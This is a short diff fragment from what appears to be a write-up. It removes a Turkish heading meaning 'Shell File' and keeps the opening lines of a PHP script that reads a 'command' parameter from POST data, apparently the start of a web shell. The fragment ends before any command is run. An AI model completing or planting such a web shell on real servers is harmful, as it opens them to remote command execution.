@@ -1,5 +1,3 @@
-#### Shell Dosyası
-```html
 <?php
 $command = $_POST["command"];
 if(isset($command))
